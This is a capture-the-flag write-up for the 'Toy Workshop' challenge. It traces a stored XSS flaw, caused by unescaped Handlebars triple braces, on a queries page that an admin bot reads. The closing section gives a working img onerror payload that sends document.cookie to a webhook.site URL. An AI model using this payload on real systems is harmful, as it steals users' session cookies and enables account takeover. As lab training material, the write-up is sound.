# Exploration #
The prompt is as follows:
> Toy Workshop
> 
> The work is going well on Santa's toy workshop but we lost contact with the manager in charge! We suspect the evil elves have taken over the workshop, can you talk to the worker elves and find out?

# Input #
Taking a look at the website, you can interact and talk to the elves. They both say
> The manage is busy right now! Please write your message below and we'll deliver it to the manager:

There is a textbox that we can put text into.

as a test I wrote
```
<h1>hello</h1>
```
and submitted it, and got a response
> Your message is delivered successfully!

Taking a look at the js we can see that the input, when submitted, gets sent to `/api/submit` as a POST request, in the JSON format

```json
{
    "query": "Your message here"
}
```

Then if the message returns a 200 status code, a message pops up that it was successfully sent.

# Route index.js #
Taking a look at the server side code provided, we can see that there are a couple of routes:
+ /
+ /api/submit
+ /queries

going to /queries redirects you back to the main page unless your ip is 127.0.0.1

When the user submits a message, the server takes the response as a query and adds it to the database. The data gets inserted with a prepare statement, making this not a point of interest.

what is interesting is that a `bot.readQueries(db)` is ran after your post is submitted.

# Bot readQueries #
Looking at the program you can see that this bot opens its own browser and goes to the queries page to read all the submittions, then deletes all of them.

Because the bot is on the server its self it is able to access /queries.

# queries.hbs #
The queries page is a list of all the queries that have been submitted.

It utilizes handlebars to template the data onto the page. The one problem is that they used `{{{}}}` instead of `{{}}` to escape the html. This means we can XSS the page, and obtain the flag from the user's cookies. 

# Exfiltration #
I went to `webhook.site` and created a free webhook url.

I then made the following code to send to the bot:
```html
<img src="a" onerror="new Image().src = `https:\/\/webhook.site/...?cook=${document.cookie}`"/>
```

This image will error becuase it can't find `a` and will run `onerror` which has js to GET a new image, but I set the `src` of that new image to the webhook I created and give it parameters of the `document.cookie`.

I went to the website and submitted my XSS and a second later I got a response and the flag was in the cookie my code extracted!